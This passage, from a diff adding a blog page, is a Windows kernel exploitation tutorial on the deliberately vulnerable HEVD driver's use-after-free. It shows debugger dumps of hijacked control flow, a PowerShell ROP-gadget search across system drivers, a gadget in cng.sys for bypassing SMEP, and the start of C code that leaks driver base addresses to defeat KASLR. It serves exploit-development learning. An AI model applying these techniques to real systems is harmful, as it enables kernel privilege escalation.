+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Also you can see the flow hijacking from Windbg, if you pay attention in the rcx value you will see the content: <code>0xdeadbeefdeadbeef</code>:</p>
+<div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-blue-200 hx-bg-blue-100 hx-text-blue-900 dark:hx-border-blue-200/30 dark:hx-bg-blue-900/30 dark:hx-text-blue-200">
+  <p class="hx-flex hx-items-center hx-font-medium"><svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>Note</p>
+
+  <div class="hx-w-full hx-min-w-0 hx-leading-7">
+    <div class="hx-mt-6 hx-leading-7 first:hx-mt-0"><p>The breakpoint was set in HEVD!UseUaFObjectNonPagedPool+0x82; Exactly in the <code>jne</code> address.</p></div>
+  </div>
+</div>
+<p><img src="image-3.png" alt="" loading="lazy" /></p>
+<p>Furthermore, we can see the relation between the register rax and rcx., being rax a pointer to the allocated object:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">3</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">dq</span> <span class="n">rax</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffc18f</span><span class="err">`</span><span class="n">ce7a52d0</span>  <span class="n">deadbeef</span><span class="err">`</span><span class="n">deadbeef</span> <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffc18f</span><span class="err">`</span><span class="n">ce7a52e0</span>  <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span> <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffc18f</span><span class="err">`</span><span class="n">ce7a52f0</span>  <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span> <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffc18f</span><span class="err">`</span><span class="n">ce7a5300</span>  <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span> <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffc18f</span><span class="err">`</span><span class="n">ce7a5310</span>  <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span> <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffc18f</span><span class="err">`</span><span class="n">ce7a5320</span>  <span class="mo">005</span><span class="mi">95959</span><span class="err">`</span><span class="mi">59595959</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00414141</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffc18f</span><span class="err">`</span><span class="n">ce7a5330</span>  <span class="mi">6</span><span class="n">b636148</span><span class="err">`</span><span class="mo">02070000</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffc18f</span><span class="err">`</span><span class="n">ce7a5340</span>  <span class="n">deadbeef</span><span class="err">`</span><span class="n">deadbeef</span> <span class="mi">59595959</span><span class="err">`</span><span class="mi">59595959</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>At the moment, people usually inserts the payload address of usermode in RCX, so the program jumps to the shellcode and execute it. The problems comes with SMEP, as we said earlier you can&rsquo;t execute code in userland throught kerne, thus we can obtain a gadget to execute the whatever is in: <code>ffffc18fce7a52d8</code> being: <code>[rax+0x10]</code> or <code>rcx + 0x10</code>.</p>
+<p>Doing this, all the code will be executed in the pool with RWX permissions.</p>
+<h3>Finding gadget<span class="hx-absolute -hx-mt-20" id="finding-gadget"></span>
+    <a href="#finding-gadget" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>As we metioned before, we need to search to any assembly code in the kernel or drivers from Windows that adds 0x10 bytes to the rax register and later execute it.</p>
+<h4>Register schema<span class="hx-absolute -hx-mt-20" id="register-schema"></span>
+    <a href="#register-schema" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>After continuing I want to show you how registers works a little to dont be confuse if you ever seen a <code>ch</code> or <code>dl</code> register:</p>
+<p><img src="image-4.png" alt="" loading="lazy" /></p>
+<p>Additionally, here a table with all 16 registers</p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Registro (64-bit)</strong></th>
+          <th><strong>32-bit (low)</strong></th>
+          <th><strong>16-bit (low)</strong></th>
+          <th><strong>8-bit High</strong></th>
+          <th><strong>8-bit Low</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>RAX</strong> (Accumulator)</td>
+          <td><code>EAX</code></td>
+          <td><code>AX</code></td>
+          <td><code>AH</code></td>
+          <td><code>AL</code></td>
+      </tr>
+      <tr>
+          <td><strong>RBX</strong> (Base)</td>
+          <td><code>EBX</code></td>
+          <td><code>BX</code></td>
+          <td><code>BH</code></td>
+          <td><code>BL</code></td>
+      </tr>
+      <tr>
+          <td><strong>RCX</strong> (Counter)</td>
+          <td><code>ECX</code></td>
+          <td><code>CX</code></td>
+          <td><code>CH</code></td>
+          <td><code>CL</code></td>
+      </tr>
+      <tr>
+          <td><strong>RDX</strong> (Data)</td>
+          <td><code>EDX</code></td>
+          <td><code>DX</code></td>
+          <td><code>DH</code></td>
+          <td><code>DL</code></td>
+      </tr>
+      <tr>
+          <td><strong>RSI</strong></td>
+          <td><code>ESI</code></td>
+          <td><code>SI</code></td>
+          <td><code>SIL</code></td>
+          <td>Source Index</td>
+      </tr>
+      <tr>
+          <td><strong>RDI</strong></td>
+          <td><code>EDI</code></td>
+          <td><code>DI</code></td>
+          <td><code>DIL</code></td>
+          <td>Destination Index</td>
+      </tr>
+      <tr>
+          <td><strong>RBP</strong></td>
+          <td><code>EBP</code></td>
+          <td><code>BP</code></td>
+          <td><code>BPL</code></td>
+          <td>Base Pointer</td>
+      </tr>
+      <tr>
+          <td><strong>RSP</strong></td>
+          <td><code>ESP</code></td>
+          <td><code>SP</code></td>
+          <td><code>SPL</code></td>
+          <td>Stack Pointer</td>
+      </tr>
+      <tr>
+          <td><strong>R8</strong></td>
+          <td><code>R8D</code></td>
+          <td><code>R8W</code></td>
+          <td><code>R8B</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R9</strong></td>
+          <td><code>R9D</code></td>
+          <td><code>R9W</code></td>
+          <td><code>R9B</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R10</strong></td>
+          <td><code>R10D</code></td>
+          <td><code>R10W</code></td>
+          <td><code>R10B</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R11</strong></td>
+          <td><code>R11D</code></td>
+          <td><code>R11W</code></td>
+          <td><code>R11B</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R12</strong></td>
+          <td><code>R12D</code></td>
+          <td><code>R12W</code></td>
+          <td><code>R12B</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R13</strong></td>
+          <td><code>R13D</code></td>
+          <td><code>R13W</code></td>
+          <td><code>R13B</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R14</strong></td>
+          <td><code>R14D</code></td>
+          <td><code>R14W</code></td>
+          <td><code>R14B</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R15</strong></td>
+          <td><code>R15D</code></td>
+          <td><code>R15W</code></td>
+          <td><code>R15B</code></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<h4>ropper.py<span class="hx-absolute -hx-mt-20" id="ropperpy"></span>
+    <a href="#ropperpy" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>With this tool, we are able to search inside any file to find the gadget that we want, having the <em>VRA</em> of the assembly code relative to the specified file.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Windows PowerShell
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; py -m ropper --file .<span class="se">\n</span>toskrnl.exe --search <span class="s2">&#34;add al, 0x10; call rax;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: .text
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: KVASCODE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: RETPOL
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: INITKDBG
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: POOLCODE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: PAGELK
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: PAGE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: PAGEKD
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: PAGEVRFY
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: PAGEHDLS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: PAGEBGFX
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: INIT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Load gadgets <span class="k">for</span> section: INITDATA
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LOAD<span class="o">]</span> removing double gadgets... 100%
+</span></span><span class="line"><span class="cl"><span class="o">[</span>INFO<span class="o">]</span> Searching <span class="k">for</span> gadgets: add al, 0x10<span class="p">;</span> call rax<span class="p">;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Since I couldn&rsquo;t find the gadget in the main drivers loaded on the system or in the kernel, I decided to write the following PowerShell script to find the gadget I wanted.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$driversPath</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$env:SystemRoot</span><span class="s2">\System32\drivers&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$searchPattern</span> <span class="p">=</span> <span class="s2">&#34;add al, 0x10; call rax;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$outputFile</span> <span class="p">=</span> <span class="s2">&#34;ropper_results.txt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="nv">$outputFile</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;Starting search for  &#39;</span><span class="nv">$searchPattern</span><span class="s2">&#39; in </span><span class="nv">$driversPath</span><span class="s2">...&#34;</span> <span class="n">-ForegroundColor</span> <span class="n">Cyan</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$drivers</span> <span class="p">=</span> <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="nv">$driversPath</span> <span class="n">-Filter</span> <span class="p">*.</span><span class="n">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$driver</span> <span class="k">in</span> <span class="nv">$drivers</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Write-Host</span> <span class="s2">&#34;Analyzing: </span><span class="p">$(</span><span class="nv">$driver</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">...&#34;</span> <span class="n">-ForegroundColor</span> <span class="n">Gray</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="p">=</span> <span class="n">py</span> <span class="n">-m</span> <span class="n">ropper</span> <span class="p">-</span><span class="o">-file</span> <span class="s2">&#34;</span><span class="p">$(</span><span class="nv">$driver</span><span class="p">.</span><span class="n">FullName</span><span class="p">)</span><span class="s2">&#34;</span> <span class="p">-</span><span class="n">-search</span> <span class="s2">&#34;</span><span class="nv">$searchPattern</span><span class="s2">&#34;</span> <span class="p">-</span><span class="n">-nocolor</span> <span class="mf">2</span><span class="p">&gt;</span><span class="vm">$null</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">-match</span> <span class="nv">$searchPattern</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;--- DRIVER: </span><span class="p">$(</span><span class="nv">$driver</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2"> ---&#34;</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="nv">$outputFile</span> <span class="n">-Append</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="nv">$outputFile</span> <span class="n">-Append</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34; </span><span class="se">`n</span><span class="s2">&#34;</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="nv">$outputFile</span> <span class="n">-Append</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">Write-Host</span> <span class="s2">&#34;[!] Gadget founded in </span><span class="p">$(</span><span class="nv">$driver</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">&#34;</span> <span class="n">-ForegroundColor</span> <span class="n">Green</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;Process completed. Results saved in </span><span class="nv">$outputFile</span><span class="s2">&#34;</span> <span class="n">-ForegroundColor</span> <span class="n">Yellow</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>After executing this code, I obtained the perfect gadget!</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>--- DRIVER: cng.sys ---
+
+0x00000001c000c7e1: add al, 0x10; call rax; </code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>To avoid any false hopes, let&rsquo;s verify that the driver is active and running on the system by default. To do this, we&rsquo;ll use the following command:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; .<span class="se">\d</span>riverquery.exe  /v <span class="p">|</span> findstr <span class="s2">&#34;cng.sys&#34;</span>
+</span></span><span class="line"><span class="cl">Module Name  Display Name           Description            Driver Type   Start Mode State      Status     Accept Stop Accept Pause Paged Pool<span class="o">(</span>bytes<span class="o">)</span> Code<span class="o">(</span>bytes<span class="o">)</span> BSS<span class="o">(</span>bytes<span class="o">)</span> Link Date              Path                                             Init<span class="o">(</span>bytes<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">============</span> <span class="o">======================</span> <span class="o">======================</span> <span class="o">=============</span> <span class="o">==========</span> <span class="o">==========</span> <span class="o">==========</span> <span class="o">===========</span> <span class="o">============</span> <span class="o">=================</span> <span class="o">===========</span> <span class="o">==========</span> <span class="o">======================</span> <span class="o">================================================</span> <span class="o">===========</span>
+</span></span><span class="line"><span class="cl">CNG          CNG                    CNG                    Kernel        Boot       Running    OK         TRUE        FALSE        <span class="m">0</span>                 561,152     <span class="m">0</span>                                 C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\D</span>rivers<span class="se">\c</span>ng.sys              4,096</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Once everything has been verified, we can use the gadget to redirect the program&rsquo;s flow to our shellcode/payload, bypassing SMEP</p>
+<h3>Applying gadget<span class="hx-absolute -hx-mt-20" id="applying-gadget"></span>
+    <a href="#applying-gadget" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Now, we have the VRA address from the gadget: <code>0x00000001c000c7e1</code> but we need the offset of the gadget relative from the base address of <code>cng.sys</code>.</p>
+<p>Using <em>DetectItEasy</em> we can obtain the base address of the driver and obtain the real offset: <code>cng.sys+0xc7e1</code></p>
+<p><img src="image-5.png" alt="" loading="lazy" /></p>
+<p>By reading it we cant identify the gadget we wanted, I think because as it is <code>call rax</code>, windbg precalculates the address and with some cache or something, it stores it incorrectly, but well, the jump to our ROP chain will run correctly.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">0</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">uu</span> <span class="n">cng</span><span class="p">.</span><span class="n">sys</span><span class="o">+</span><span class="mh">0xc7e1</span>
+</span></span><span class="line"><span class="cl"><span class="n">cng</span><span class="o">!</span><span class="n">BCryptHashData</span><span class="o">+</span><span class="mh">0x3ef1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mf">294867e1</span> <span class="mo">0410</span>            <span class="n">add</span>     <span class="n">al</span><span class="p">,</span><span class="mi">10</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mf">294867e3</span> <span class="n">e8f8ba0a00</span>      <span class="n">call</span>    <span class="n">fffff802</span><span class="err">`</span><span class="mf">295322e0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mf">294867e8</span> <span class="mi">396</span><span class="n">c2454</span>        <span class="n">cmp</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">54</span><span class="n">h</span><span class="p">],</span><span class="n">ebp</span>
+</span></span><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mi">294867</span><span class="n">ec</span> <span class="mf">0f</span><span class="mi">8556010000</span>    <span class="n">jne</span>     <span class="n">cng</span><span class="o">!</span><span class="n">BCryptHashData</span><span class="o">+</span><span class="mh">0x4058</span> <span class="p">(</span><span class="n">fffff802</span><span class="err">`</span><span class="mi">29486948</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mf">294867f</span><span class="mi">2</span> <span class="mi">448</span><span class="n">b6c2444</span>      <span class="n">mov</span>     <span class="n">r13d</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">44</span><span class="n">h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mf">294867f</span><span class="mi">7</span> <span class="n">eb1b</span>            <span class="n">jmp</span>     <span class="n">cng</span><span class="o">!</span><span class="n">BCryptHashData</span><span class="o">+</span><span class="mh">0x3f24</span> <span class="p">(</span><span class="n">fffff802</span><span class="err">`</span><span class="mi">29486814</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mf">294867f</span><span class="mi">9</span> <span class="mi">8</span><span class="n">bc3</span>            <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">ebx</span>
+</span></span><span class="line"><span class="cl"><span class="n">fffff802</span><span class="err">`</span><span class="mf">294867f</span><span class="n">b</span> <span class="mf">0f</span><span class="n">afc1</span>          <span class="n">imul</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ecx</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h4>Bypassing KASRL<span class="hx-absolute -hx-mt-20" id="bypassing-kasrl"></span>
+    <a href="#bypassing-kasrl" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>Using the function <code>getBaseAddr</code> from the blog: <a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/" target="_blank" rel="noopener">https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/</a>, we can obtain the base address of any file, in this case, the driver <code>cng.sys</code>, here a full code to obtain the leak:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ULONGLONG</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">drvName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">drivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">cbNeeded</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">nDrivers</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="n">drivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cbNeeded</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">cbNeeded</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WCHAR</span> <span class="n">szDrivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nDrivers</span> <span class="o">=</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
